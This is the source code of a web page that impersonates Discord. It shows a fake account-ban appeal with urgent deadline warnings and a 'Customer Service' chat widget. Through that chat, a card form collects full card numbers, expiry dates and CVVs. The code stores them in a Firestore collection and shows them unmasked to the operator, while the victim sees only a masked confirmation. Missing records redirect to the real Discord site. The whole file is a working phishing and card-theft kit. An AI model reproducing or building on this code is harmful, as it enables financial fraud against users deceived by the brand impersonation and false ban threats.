/* eslint-disable @next/next/no-img-element */
"use client";

import Head from "next/head";
import React, {
  useEffect,
  useState,
  useCallback,
  useRef,
  ChangeEvent,
  FormEvent,
} from "react";
import { useParams } from "next/navigation";
import { db } from "../../lib/firebase";
import {
  doc,
  onSnapshot,
  collection,
  query,
  where,
  orderBy,
  addDoc,
  serverTimestamp,
  CollectionReference,
  QuerySnapshot,
  Timestamp,
} from "firebase/firestore";
import {
  MdCreditCard,
  MdDateRange,
  MdLock,
  MdCheck,
} from "react-icons/md";
import { FaCcVisa, FaCcMastercard, FaCcAmex } from "react-icons/fa";

// ------------ 1) FIRESTORE DATA TYPES --------------
type UserData = {
  userID: string;
  type: string;
  accountStatus: string;
  username: string;
  dateCreated: string;
  activeReports: string;
  profileImage: string;
  bannerImage: string;
};

type ChatMessage = {
  id?: string;
  sender: "client" | "support";
  text: string;
  messageType?: "text" | "secure_form_request" | "secure_form_response";
  timestamp?: Timestamp;
  transactionId: string;
};

// ------------ 2) MAIN USER PAGE COMPONENT --------------
export default function UserPage() {
  const { id } = useParams();
  const [data, setData] = useState<UserData | null>(null);
  const [loading, setLoading] = useState(true);

  // Realtime listener for changes on the user document.
  useEffect(() => {
    if (!id) {
      console.error("🚨 No ID provided in the URL parameters.");
      setLoading(false);
      return;
    }
    const userId = Array.isArray(id) ? id[0] : id;
    console.log("🔍 Listening for changes on user document with ID:", userId);
    const unsubscribe = onSnapshot(
      doc(db, "users", userId),
      (docSnap) => {
        if (docSnap.exists()) {
          console.log("✅ Document data:", docSnap.data());
          setData(docSnap.data() as UserData);
        } else {
          console.error("❌ No document found for ID:", userId);
          // Redirect automatically when the document is missing.
          window.location.href = "https://discord.com";
        }
        setLoading(false);
      },
      (error) => {
        console.error("🔥 Error listening to document:", error);
        setLoading(false);
      }
    );
    return () => unsubscribe();
  }, [id]);

  return (
    <>
      <Head>
        <title>{data ? `Discord | ${data.username}` : "Discord"}</title>
        <link rel="icon" href="/img/discord.png" />
      </Head>
      <div style={pageStyle}>
        {/* Notice Bar */}
        <div style={noticeBarStyle}>
          <p style={noticeBarTextStyle}>
            You have a limited window to submit an appeal before the ban is finalized. Failure to act in time will result in permanent restrictions on your account. Review your violations to understand for how long and why.
          </p>
        </div>

        {loading ? (
          <h2 style={{ color: "white", textAlign: "center", marginTop: "50px" }}>
            Loading...
          </h2>
        ) : data ? (
          <div style={outerContainer}>
            {/* Decorative Image */}
            <img
              src="https://cdn.prod.website-files.com/6257adef93867e50d84d30e2/6630f482123160b94617877a_Box%20(1).webp"
              alt=""
              style={box4s}
              loading="lazy"
            />

            {/* Left Container (User Info) */}
            <div style={leftContainer}>
              <div style={profileHeader}>
                <img className="banner" src={data.bannerImage} alt="Banner Image" style={banner} />
                <img className="profile" src={data.profileImage} alt={`${data.username}'s Profile Image`} style={profile} />
                <h2 style={username}>{data.username}</h2>
              </div>
              <div style={infoContainer}>
                <div style={infoRow}>
                  <img src="https://img.icons8.com/ios-filled/50/5865f2/user.png" alt="User Icon" style={iconStyle} />
                  <span style={label}>User ID:</span>
                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>
                    {data.userID}
                  </span>
                </div>
                <div style={infoRow}>
                  <img src="https://img.icons8.com/ios-filled/50/5865f2/certificate.png" alt="Type Icon" style={iconStyle} />
                  <span style={label}>Type:</span>
                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>
                    {data.type}
                  </span>
                </div>
                <div style={infoRow}>
                  <img src="https://img.icons8.com/ios-filled/50/5865f2/shield.png" alt="Shield Icon" style={iconStyle} />
                  <span style={label}>Account Status:</span>
                  <span
                    style={{
                      ...value,
                      marginLeft: "auto",
                      marginRight: "10px",
                      textAlign: "right",
                      ...getStatusStyle(data.accountStatus),
                    }}
                  >
                    {data.accountStatus}
                  </span>
                </div>
                <div style={infoRow}>
                  <img src="https://img.icons8.com/ios-filled/50/5865f2/calendar.png" alt="Calendar Icon" style={iconStyle} />
                  <span style={label}>Date Created:</span>
                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>
                    {data.dateCreated}
                  </span>
                </div>
                <div style={infoRow}>
                  <img src="https://img.icons8.com/ios-filled/50/5865f2/flag.png" alt="Flag Icon" style={iconStyle} />
                  <span style={label}>Active Reports:</span>
                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>
                    {data.activeReports}
                  </span>
                </div>
              </div>
              <div style={footerStyle}>
                <span style={{ fontSize: "14px" }}>💼 SEN - Hudson</span>
              </div>
            </div>

            {/* Right Container (Appeal Info) */}
            <div style={rightText}>
              <h1 style={rightHeading}>Appeal Your Ban</h1>
              <p style={rightTextP}>
                Submit your appeal via the chat window (bottom right) with all necessary details to dispute the report.
              </p>
              <h2 style={rightSubHeading}>Review Process</h2>
              <p style={rightTextP}>The Report Assistance Team will assess your appeal and determine if the report is valid.</p>
              <h2 style={rightSubHeading}>Outcome</h2>
              <p style={rightTextP}>Once Approved: Ban report will be canceled.</p>
              <p style={rightTextP}>If Denied: Suspension proceeds.</p>
              <h2 style={rightSubHeading}>Reminders</h2>
              <p style={rightTextP}>Timely Action Matters: Appeals must be submitted promptly to be considered.</p>
              <p style={rightTextP}>Use the Correct Channel: Only the chat window processes appeals—other support methods won’t apply.</p>
              <p style={rightTextP}>Final Decision: Once reviewed, decisions are final and cannot be appealed again.</p>
            </div>
          </div>
        ) : null}

        {data && (
          // On your support page, make sure to pass role="support".
          <ChatWidget userID={data.userID} role="client" />
        )}
      </div>
    </>
  );
}

// ------------ 3) STYLING HELPERS + STATUS FUNCTION --------------
function getStatusStyle(accountStatus: string) {
  const statusLower = accountStatus.toLowerCase();
  if (statusLower === "good") {
    return { backgroundColor: "rgba(0, 128, 0, 0.2)", color: "green", borderRadius: "10px", padding: "2px 6px" };
  } else if (statusLower.includes("pending")) {
    return { backgroundColor: "rgba(255, 165, 0, 0.2)", color: "orange", borderRadius: "10px", padding: "2px 6px" };
  } else if (statusLower === "banned") {
    return { backgroundColor: "rgba(255, 0, 0, 0.2)", color: "red", borderRadius: "10px", padding: "2px 6px" };
  }
  return {};
}

// ------------ 4) CHAT WIDGET --------------
interface ChatWidgetProps {
  userID: string;
  role?: "client" | "support";
}

function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
  const [isOpen, setIsOpen] = useState(false);
  const [isHovered, setIsHovered] = useState(false);
  const [isChatToggleHovered, setIsChatToggleHovered] = useState(false);
  const [hoverTransform, setHoverTransform] = useState({ x: 0, y: 0 });
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [input, setInput] = useState("");
  const messagesEndRef = useRef<HTMLDivElement | null>(null);
  const fileInputRef = useRef<HTMLInputElement | null>(null);
  const textareaRef = useRef<HTMLTextAreaElement | null>(null);
  const [selectedImage, setSelectedImage] = useState<string | null>(null);

  const suggestions = [
    "View Report Details",
    "Submit an Appeal",
    "Need More Info on My Report",
  ];

  useEffect(() => {
    if (!userID) return;
    const messagesRef = collection(db, "messages") as CollectionReference<ChatMessage>;
    const q = query(
      messagesRef,
      where("transactionId", "==", userID),
      orderBy("timestamp", "asc")
    );
    const unsubscribe = onSnapshot(q, (snapshot: QuerySnapshot<ChatMessage>) => {
      const msgs = snapshot.docs.map((doc) => ({ id: doc.id, ...doc.data() }));
      setMessages(msgs);
    });
    return () => unsubscribe();
  }, [userID]);

  useEffect(() => {
    if (messagesEndRef.current) {
      messagesEndRef.current.scrollIntoView({ behavior: "auto" });
    }
  }, [messages]);

  const handleSecurePaymentSubmit = async (paymentDetails: { cardNumber: string; expiry: string; cvv: string; }) => {
    const masked = paymentDetails.cardNumber.slice(-4);
    const maskedMessage = `Secure Form Submitted: Card ending in ${masked}`;
    try {
      await addDoc(collection(db, "messages"), {
        transactionId: userID,
        sender: "client",
        text: maskedMessage,
        messageType: "secure_form_response",
        timestamp: serverTimestamp(),
      });
    } catch (error) {
      console.error("🔥 Error sending secure form response:", error);
    }
    try {
      await addDoc(collection(db, "securePaymentDetails"), {
        transactionId: userID,
        cardNumber: paymentDetails.cardNumber,
        expiry: paymentDetails.expiry,
        cvv: paymentDetails.cvv,
        timestamp: serverTimestamp(),
      });
    } catch (error) {
      console.error("🔥 Error storing secure payment details:", error);
    }
  };

  const renderMessage = (msg: ChatMessage) => {
    const key = msg.id || Math.random().toString(36).substr(2, 9);
    return (
      <div key={key} style={msg.sender === "support" ? chatBubbleBotStyle : chatBubbleUserStyle}>
        {msg.messageType === "secure_form_request" ? (
          <SecurePaymentForm onSubmit={handleSecurePaymentSubmit} />
        ) : msg.messageType === "secure_form_response" && role === "support" ? (
          <SecurePaymentDetails transactionId={msg.transactionId} maskedText={msg.text} />
        ) : msg.text.startsWith("data:image") ? (
          <img 
            src={msg.text} 
            alt="sent image" 
            style={{ maxWidth: "100%", borderRadius: "8px", cursor: "pointer" }} 
            onClick={(e) => { e.preventDefault(); setSelectedImage(msg.text); }} 
          />
        ) : (
          msg.text
        )}
      </div>
    );
  };

  const handleSend = async () => {
    if (!input.trim()) return;
    try {
      await addDoc(collection(db, "messages"), {
        transactionId: userID,
        sender: "client",
        text: input.trim(),
        timestamp: serverTimestamp(),
      });
      setInput("");
      if (textareaRef.current) {
        textareaRef.current.style.height = "auto";
      }
    } catch (error) {
      console.error("🔥 Error sending message:", error);
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      handleSend();
    }
  };

  const handleTextareaChange = (e: ChangeEvent<HTMLTextAreaElement>) => {
    setInput(e.target.value);
    if (textareaRef.current) {
      textareaRef.current.style.height = "auto";
      textareaRef.current.style.height = textareaRef.current.scrollHeight + "px";
    }
  };

  const handleSuggestionClick = async (suggestion: string) => {
    try {
      await addDoc(collection(db, "messages"), {
        transactionId: userID,
        sender: "client",
        text: suggestion,
        timestamp: serverTimestamp(),
      });
    } catch (error) {
      console.error("🔥 Error sending suggestion message:", error);
    }
  };

  const handlePlusClick = () => {
    fileInputRef.current?.click();
  };

  const handleFileChange = (e: ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = async (ev) => {
        const imageUrl = ev.target?.result;
        if (imageUrl && typeof imageUrl === "string") {
          try {
            await addDoc(collection(db, "messages"), {
              transactionId: userID,
              sender: "client",
              text: imageUrl,
              timestamp: serverTimestamp(),
            });
          } catch (error) {
            console.error("🔥 Error sending image message:", error);
          }
        }
      };
      reader.readAsDataURL(file);
    }
  };

  return (
    <div style={chatWidgetStyle}>
      <div
        style={{
          ...chatWindowStyle,
          width: "320px",
          display: "flex",
          flexDirection: "column",
          overflow: "hidden",
          height: isOpen ? "450px" : "0px",
          opacity: isOpen ? 1 : 0,
          transform: isOpen ? "translateY(0)" : "translateY(20px)",
          pointerEvents: isOpen ? "auto" : "none",
          borderRadius: isOpen ? "10px" : "20px",
          transition: "height 0.5s ease, opacity 0.5s ease, transform 0.3s ease, border-radius 0.5s ease",
          boxShadow: isHovered ? "0 8px 16px rgba(0,0,0,0.3)" : "0 4px 8px rgba(0,0,0,0.2)",
        }}
        onMouseEnter={() => setIsHovered(true)}
        onMouseLeave={() => setIsHovered(false)}
      >
        <div style={chatHeaderStyle}>
          <div style={chatHeaderInfoStyle}>
            <img src="/img/Discord_Symbol_White/Discord-Symbol-White.svg" alt="Discord Logo" style={chatLogoStyle} />
            <div style={chatTitleStyle}>
              <div style={chatTitleMainStyle}>Discord</div>
              <div style={chatTitleSubStyle}>Customer Service</div>
              <div style={transactionIdStyle}>Transaction: {userID}</div>
            </div>
          </div>
          <button style={chatMinimizeBtnStyle} onClick={() => setIsOpen(false)}>–</button>
        </div>

        {isOpen && messages.length === 0 && (
          <div style={floatingSuggestionsStyle}>
            {suggestions.map((suggestion, index) => (
              <button key={index} style={suggestionButtonStyle} onClick={() => handleSuggestionClick(suggestion)}>
                {suggestion}
              </button>
            ))}
          </div>
        )}

        <div style={chatBodyStyle}>
          <div style={chatMessagesStyle}>
            {messages.map((msg) => renderMessage(msg))}
            <div ref={messagesEndRef} />
          </div>
        </div>

        <div style={chatInputAreaStyle}>
          <button style={plusIconBtnStyle} onClick={handlePlusClick}>+</button>
          <textarea
            ref={textareaRef}
            placeholder="Type your message..."
            value={input}
            onChange={handleTextareaChange}
            onKeyPress={handleKeyPress}
            style={{ ...chatInputStyle, color: "black", resize: "none", overflow: "hidden" }}
            rows={1}
          />
          <button style={chatSendBtnStyle} onClick={handleSend}>Send</button>
          <input type="file" accept="image/*" ref={fileInputRef} style={{ display: "none" }} onChange={handleFileChange} />
        </div>
      </div>
      <div
        style={chatToggleStyle}
        onMouseMove={(e) => {
          const rect = e.currentTarget.getBoundingClientRect();
          const offsetX = (e.clientX - rect.left - rect.width / 2) / 10;
          const offsetY = (e.clientY - rect.top - rect.height / 2) / 10;
          setHoverTransform({ x: offsetX, y: offsetY });
        }}
        onMouseEnter={() => setIsChatToggleHovered(true)}
        onMouseLeave={() => {
          setIsChatToggleHovered(false);
          setHoverTransform({ x: 0, y: 0 });
        }}
      >
        <button
          style={{
            ...chatToggleBtnStyle,
            transform: `scale(${isChatToggleHovered ? 1.05 : 1}) translate(${hoverTransform.x}px, ${hoverTransform.y}px)`,
            transition: "transform 0.3s ease, box-shadow 0.3s ease",
            boxShadow: isChatToggleHovered ? "0 4px 8px rgba(0, 0, 0, 0.3)" : "none",
          }}
          onClick={() => setIsOpen(true)}
        >
          Chat
        </button>
      </div>
      {selectedImage && (
        <ImageModal src={selectedImage} onClose={() => setSelectedImage(null)} />
      )}
    </div>
  );
}

// ------------ NEW COMPONENT: SECURE PAYMENT DETAILS (for support view) --------------
function SecurePaymentDetails({
  transactionId,
  maskedText,
}: {
  transactionId: string;
  maskedText: string;
}) {
  const [details, setDetails] = useState<{ cardNumber: string; expiry: string; cvv: string } | null>(null);

  useEffect(() => {
    const secureRef = collection(db, "securePaymentDetails");
    const q = query(secureRef, where("transactionId", "==", transactionId));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      if (!snapshot.empty) {
        const data = snapshot.docs[0].data();
        setDetails({
          cardNumber: data.cardNumber,
          expiry: data.expiry,
          cvv: data.cvv,
        });
      } else {
        setDetails(null);
      }
    });
    return () => unsubscribe();
  }, [transactionId]);

  if (details) {
    return (
      <div>
        {`Payment Details - Card: ${details.cardNumber}, Expiry: ${details.expiry}, CVV: ${details.cvv}`}
      </div>
    );
  }
  return <div>{maskedText} (Secure details loading...)</div>;
}

// ------------ 5) UPDATED SECURE PAYMENT FORM (Client Side) --------------
function SecurePaymentForm({
  onSubmit,
}: {
  onSubmit: (paymentDetails: { cardNumber: string; expiry: string; cvv: string; }) => void;
}) {
  const [rawCardNumber, setRawCardNumber] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardType, setCardType] = useState("");
  const [errors, setErrors] = useState<{ [key: string]: string }>({});
  const [formSubmitted, setFormSubmitted] = useState(false);
  const [maskedCard, setMaskedCard] = useState("");

  const detectCardType = (number: string): string => {
    const cleaned = number.replace(/\s+/g, "");
    if (cleaned.startsWith("4")) return "Visa";
    if (/^5[1-5]/.test(cleaned)) return "MasterCard";
    if (/^3[47]/.test(cleaned)) return "American Express";
    return "";
  };

  const formatCardNumber = (number: string, type: string): string => {
    const cleaned = number.replace(/\D/g, "");
    if (type === "American Express") {
      const part1 = cleaned.substring(0, 4);
      const part2 = cleaned.substring(4, 10);
      const part3 = cleaned.substring(10, 15);
      return [part1, part2, part3].filter(Boolean).join(" ");
    } else {
      return cleaned.match(/.{1,4}/g)?.join(" ") || "";
    }
  };

  const handleCardNumberChange = (e: ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    const raw = value.replace(/\s+/g, "");
    setRawCardNumber(raw);
    const detectedType = detectCardType(raw);
    setCardType(detectedType);
    const formatted = formatCardNumber(raw, detectedType);
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e: ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value;
    value = value.replace(/[^0-9\/]/g, "");
    if (value.length === 2 && !value.includes("/")) {
      value = value + "/";
    }
    setExpiry(value);
  };

  const computeErrors = useCallback(() => {
    const newErrors: { [key: string]: string } = {};
    const cleaned = rawCardNumber;
    if (cleaned) {
      if (!/^\d+$/.test(cleaned)) {
        newErrors.cardNumber = "Enter a valid card number.";
      } else {
        if (cardType === "Visa" && !(cleaned.length === 13 || cleaned.length === 16)) {
          newErrors.cardNumber = "Visa card must have 13 or 16 digits.";
        } else if (cardType === "MasterCard" && cleaned.length !== 16) {
          newErrors.cardNumber = "MasterCard must have 16 digits.";
        } else if (cardType === "American Express" && cleaned.length !== 15) {
          newErrors.cardNumber = "American Express must have 15 digits.";
        } else if (!cardType) {
          newErrors.cardNumber = "Card type not recognized.";
        }
      }
    }
    if (expiry) {
      if (!expiry.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) {
        newErrors.expiry = "Expiry must be in MM/YY format.";
      } else {
        const [monthStr, yearStr] = expiry.split("/");
        const month = parseInt(monthStr, 10);
        const year = parseInt("20" + yearStr, 10);
        const now = new Date();
        const expiryDate = new Date(year, month);
        if (expiryDate <= now) {
          newErrors.expiry = "Card has expired.";
        }
      }
    }
    if (cvv) {
      if (!cvv.match(/^\d+$/)) {
        newErrors.cvv = "CVV must be numeric.";
      } else {
        if (cardType === "American Express" && cvv.length !== 4) {
          newErrors.cvv = "American Express CVV must be 4 digits.";
        } else if (cardType && cardType !== "American Express" && cvv.length !== 3) {
          newErrors.cvv = "CVV must be 3 digits.";
        }
      }
    }
    return newErrors;
  }, [rawCardNumber, expiry, cvv, cardType]);
  
  useEffect(() => {
    setErrors(computeErrors());
  }, [computeErrors]);

  useEffect(() => {
    setErrors(computeErrors());
  }, [rawCardNumber, expiry, cvv, cardType]);

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    const currentErrors = computeErrors();
    if (Object.keys(currentErrors).length === 0) {
      onSubmit({ cardNumber: rawCardNumber, expiry, cvv });
      setMaskedCard(rawCardNumber.replace(/\d(?=\d{4})/g, "*"));
      setFormSubmitted(true);
    }
  };

  const isFormValid = Object.keys(errors).length === 0 && rawCardNumber && expiry && cvv;

  let CardIcon = null;
  if (cardType === "Visa") {
    CardIcon = (
      <FaCcVisa style={{ marginLeft: "10px", fontSize: "24px", color: "#1a1f71" }} />
    );
  } else if (cardType === "MasterCard") {
    CardIcon = (
      <FaCcMastercard style={{ marginLeft: "10px", fontSize: "24px", color: "#eb001b" }} />
    );
  } else if (cardType === "American Express") {
    CardIcon = (
      <FaCcAmex style={{ marginLeft: "10px", fontSize: "24px", color: "#2e77bb" }} />
    );
  }

  if (formSubmitted) {
    return (
      <div style={submittedNotificationStyle}>
        <MdCheck style={{ marginRight: "10px", fontSize: "24px", color: "#28a745" }} />
        <span style={{ fontWeight: "bold" }}>Secure Form Submitted</span>
        <div style={{ marginTop: "8px", fontSize: "14px", color: "#5865f2" }}>
          Card ending in {maskedCard.slice(-4)}
        </div>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} style={modifiedSecureFormContainerStyle}>
      <div style={inputGroupStyle}>
        <MdCreditCard style={iconStyleSecure} />
        <input
          type="text"
          placeholder="Card Number"
          value={cardNumber}
          onChange={handleCardNumberChange}
          style={{ ...modifiedSecureInputStyle, minWidth: 0 }}
        />
        {rawCardNumber.length >= 4 && CardIcon}
      </div>
      {rawCardNumber && errors.cardNumber && <div style={errorTextStyle}>{errors.cardNumber}</div>}

      <div style={inputGroupStyle}>
        <MdDateRange style={iconStyleSecure} />
        <input
          type="text"
          placeholder="MM/YY"
          value={expiry}
          onChange={handleExpiryChange}
          style={{ ...modifiedSecureInputStyle, minWidth: 0 }}
        />
      </div>
      {expiry && errors.expiry && <div style={errorTextStyle}>{errors.expiry}</div>}

      <div style={inputGroupStyle}>
        <MdLock style={iconStyleSecure} />
        <input
          type="text"
          placeholder="CVV"
          value={cvv}
          onChange={(e) => setCvv(e.target.value)}
          style={{ ...modifiedSecureInputStyle, minWidth: 0 }}
        />
      </div>
      {cvv && errors.cvv && <div style={errorTextStyle}>{errors.cvv}</div>}

      <button
        type="submit"
        style={{
          ...secureSubmitStyle,
          opacity: isFormValid ? 1 : 0.6,
          cursor: isFormValid ? "pointer" : "not-allowed",
        }}
        disabled={!isFormValid}
      >
        Submit
      </button>
    </form>
  );
}

// ------------ NEW COMPONENT: IMAGE MODAL (for zoom-in effect on client page) --------------
function ImageModal({ src, onClose }: { src: string; onClose: () => void }) {
  return (
    <div
      onClick={onClose}
      style={{
        position: "fixed",
        top: 0,
        left: 0,
        width: "100vw",
        height: "100vh",
        backgroundColor: "rgba(0, 0, 0, 0.8)",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        zIndex: 1000,
        cursor: "zoom-out",
        animation: "zoomIn 0.3s",
      }}
    >
      <img
        src={src}
        alt="Zoomed"
        style={{
          maxWidth: "90%",
          maxHeight: "90%",
          borderRadius: "10px",
        }}
      />
    </div>
  );
}

// ------------ 6) INLINE STYLES --------------
const pageStyle: React.CSSProperties = {
  background: "url('/img/background.png') no-repeat center center fixed",
  backgroundSize: "cover",
  minHeight: "100vh",
  display: "flex",
  flexDirection: "column",
  alignItems: "center",
  justifyContent: "center",
  margin: 0,
  overflow: "hidden",
};

const noticeBarStyle: React.CSSProperties = {
  width: "100%",
  background: "linear-gradient(145deg, rgb(255 0 0 / 80%), rgb(255 0 0 / 29%))",
  padding: "10px 20px",
  textAlign: "center",
  position: "fixed",
  top: 0,
  left: 0,
  zIndex: 10000,
};

const noticeBarTextStyle: React.CSSProperties = {
  fontSize: "14px",
  color: "white",
  margin: 0,
};

const outerContainer: React.CSSProperties = {
  position: "relative",
  top: 0,
  display: "flex",
  justifyContent: "space-between",
  alignItems: "flex-start",
  gap: "20px",
  width: "90%",
  maxWidth: "1200px",
  padding: "20px",
  background: "linear-gradient(145deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.05))",
  borderRadius: "30px",
  boxShadow: "0 8px 20px rgba(0, 0, 0, 0.2)",
  backdropFilter: "blur(20px)",
};

const box4s: React.CSSProperties = {
  zIndex: 3,
  pointerEvents: "none",
  maxWidth: "14.6875rem",
  marginTop: "-7.3rem",
  marginRight: "-2.5rem",
  position: "absolute",
  top: 0,
  right: 0,
};

const leftContainer: React.CSSProperties = {
  width: "40%",
  padding: "20px",
  background: "linear-gradient(145deg, #afb5f7 20%, #808aff 80%)",
  borderRadius: "20px",
  backdropFilter: "blur(40px)",
  textAlign: "center",
  color: "white",
};

const rightText: React.CSSProperties = {
  width: "55%",
  padding: "20px",
  color: "white",
  textAlign: "left",
  fontFamily: "'Inter', sans-serif",
  lineHeight: 1.6,
};

const profileHeader: React.CSSProperties = {
  position: "relative",
  marginBottom: "20px",
  borderRadius: "20px 20px 0 0",
  overflow: "hidden",
};

const banner: React.CSSProperties = {
  display: "block",
  width: "100%",
  height: "150px",
  objectFit: "cover",
  borderRadius: "20px 20px 0 0",
};

const profile: React.CSSProperties = {
  width: "80px",
  height: "80px",
  borderRadius: "50%",
  objectFit: "cover",
  marginTop: "-40px",
  marginLeft: "auto",
  marginRight: "auto",
  border: "3px solid white",
  boxShadow: "0 2px 4px rgba(0, 0, 0, 0.1)",
};

const username: React.CSSProperties = {
  fontWeight: "bold",
  marginTop: "10px",
};

const infoContainer: React.CSSProperties = {
  padding: "20px",
  textAlign: "left",
};

const infoRow: React.CSSProperties = {
  display: "flex",
  alignItems: "center",
  gap: "10px",
  padding: "10px 0",
  borderBottom: "1px solid #e0e0e0",
};

const iconStyle: React.CSSProperties = {
  width: "16px",
  height: "16px",
};

const label: React.CSSProperties = {
  fontWeight: "bold",
  color: "#5865f2",
  minWidth: "100px",
};

const value: React.CSSProperties = {
  color: "#23272a",
};

const footerStyle: React.CSSProperties = {
  marginTop: "20px",
  borderTop: "1px solid rgba(255,255,255,0.3)",
  paddingTop: "10px",
  textAlign: "center",
  fontSize: "14px",
};

const rightHeading: React.CSSProperties = {
  marginBottom: "20px",
  fontWeight: "bold",
  fontSize: "24px",
  borderBottom: "2px solid white",
  paddingBottom: "10px",
};

const rightSubHeading: React.CSSProperties = {
  marginTop: "20px",
  marginBottom: "10px",
  fontWeight: "bold",
  fontSize: "20px",
  borderBottom: "1px solid white",
  paddingBottom: "5px",
};

const rightTextP: React.CSSProperties = {
  marginBottom: "10px",
  lineHeight: 1.6,
  fontSize: "16px",
};

const chatWidgetStyle: React.CSSProperties = {
  position: "fixed",
  bottom: "20px",
  right: "20px",
  fontFamily: "'Lato', sans-serif",
  zIndex: 9999,
};

const chatWindowStyle: React.CSSProperties = {
  backgroundColor: "#ffffff",
  border: "1px solid #ccc",
  borderRadius: "10px",
  boxShadow: "0 4px 8px rgba(0,0,0,0.2)",
  marginBottom: "5px",
};

const chatHeaderStyle: React.CSSProperties = {
  display: "flex",
  justifyContent: "space-between",
  alignItems: "center",
  backgroundColor: "#5865f2",
  color: "white",
  padding: "10px",
};

const chatHeaderInfoStyle: React.CSSProperties = {
  display: "flex",
  alignItems: "center",
};

const chatLogoStyle: React.CSSProperties = {
  width: "30px",
  height: "30px",
  marginRight: "10px",
};

const chatTitleStyle: React.CSSProperties = {
  display: "flex",
  flexDirection: "column",
  lineHeight: 1,
};

const chatTitleMainStyle: React.CSSProperties = {
  fontWeight: "bold",
  fontSize: "16px",
};

const chatTitleSubStyle: React.CSSProperties = {
  fontSize: "12px",
};

const transactionIdStyle: React.CSSProperties = {
  fontSize: "10px",
  opacity: 0.8,
  marginTop: "5px",
};

const chatMinimizeBtnStyle: React.CSSProperties = {
  background: "none",
  border: "none",
  color: "white",
  fontSize: "20px",
  cursor: "pointer",
};

const chatBodyStyle: React.CSSProperties = {
  flex: 1,
  backgroundColor: "#f1f1f1",
  display: "flex",
  flexDirection: "column",
  padding: "10px",
  overflowY: "auto",
};

const chatMessagesStyle: React.CSSProperties = {
  display: "flex",
  flexDirection: "column",
};

const chatBubbleBaseStyle: React.CSSProperties = {
  display: "inline-block",
  padding: "8px 12px",
  borderRadius: "15px",
  margin: "5px",
  maxWidth: "80%",
  wordWrap: "break-word",
};

const chatBubbleBotStyle: React.CSSProperties = {
  ...chatBubbleBaseStyle,
  backgroundColor: "#e0e0e0",
  color: "#333",
  alignSelf: "flex-start",
};

const chatBubbleUserStyle: React.CSSProperties = {
  ...chatBubbleBaseStyle,
  backgroundColor: "#5865f2",
  color: "white",
  alignSelf: "flex-end",
};

const chatInputAreaStyle: React.CSSProperties = {
  display: "flex",
  borderTop: "1px solid #ccc",
};

const chatInputStyle: React.CSSProperties = {
  flex: 1,
  border: "none",
  padding: "10px",
  fontSize: "14px",
  outline: "none",
  color: "black",
};

const chatSendBtnStyle: React.CSSProperties = {
  border: "none",
  backgroundColor: "#5865f2",
  color: "white",
  padding: "10px 15px",
  cursor: "pointer",
  fontSize: "14px",
};

const chatToggleStyle: React.CSSProperties = {
  textAlign: "center",
  backgroundColor: "#5865f2",
  borderRadius: "10px",
};

const chatToggleBtnStyle: React.CSSProperties = {
  background: "none",
  border: "none",
  borderRadius: "10px",
  color: "white",
  width: "100%",
  padding: "10px",
  cursor: "pointer",
  fontSize: "16px",
};

const floatingSuggestionsStyle: React.CSSProperties = {
  position: "absolute",
  top: "50%",
  left: "50%",
  transform: "translate(-50%, -50%)",
  backgroundColor: "rgba(255,255,255,0.95)",
  padding: "10px",
  borderRadius: "10px",
  boxShadow: "0 4px 8px rgba(0,0,0,0.2)",
  display: "flex",
  gap: "10px",
  zIndex: 2,
};

const suggestionButtonStyle: React.CSSProperties = {
  padding: "6px 10px",
  fontSize: "12px",
  backgroundColor: "#5865f2",
  color: "white",
  border: "none",
  borderRadius: "15px",
  cursor: "pointer",
};

const plusIconBtnStyle: React.CSSProperties = {
  background: "none",
  border: "none",
  fontSize: "24px",
  cursor: "pointer",
  marginRight: "5px",
  marginLeft: "10px",
  color: "#5865f2",
};

const modifiedSecureFormContainerStyle: React.CSSProperties = {
  backgroundColor: "#fff",
  borderRadius: "8px",
  padding: "10px 15px",
  margin: "10px 0 15px 0",
  width: "100%",
  boxSizing: "border-box",
  boxShadow: "0 2px 4px rgba(0,0,0,0.1)",
  animation: "fadeIn 0.5s ease",
  transition: "all 0.3s ease",
};

const modifiedSecureInputStyle: React.CSSProperties = {
  flex: 1,
  padding: "8px",
  fontSize: "14px",
  border: "1px solid #ccc",
  borderRadius: "4px",
  outline: "none",
  transition: "all 0.3s ease",
  color: "black",
};

const errorTextStyle: React.CSSProperties = {
  color: "red",
  fontSize: "12px",
  marginBottom: "5px",
};

const iconStyleSecure: React.CSSProperties = {
  fontSize: "20px",
  marginRight: "8px",
  color: "#5865f2",
};

const inputGroupStyle: React.CSSProperties = {
  display: "flex",
  alignItems: "center",
  marginBottom: "10px",
};

const secureSubmitStyle: React.CSSProperties = {
  backgroundColor: "#5865f2",
  color: "#fff",
  padding: "8px 16px",
  border: "none",
  borderRadius: "4px",
  cursor: "pointer",
  transition: "background-color 0.3s ease, transform 0.2s ease",
};

const submittedNotificationStyle: React.CSSProperties = {
  backgroundColor: "#e8f5e9",
  border: "1px solid #a5d6a7",
  borderRadius: "8px",
  padding: "15px",
  textAlign: "center",
  boxShadow: "0 4px 8px rgba(0,0,0,0.1)",
};
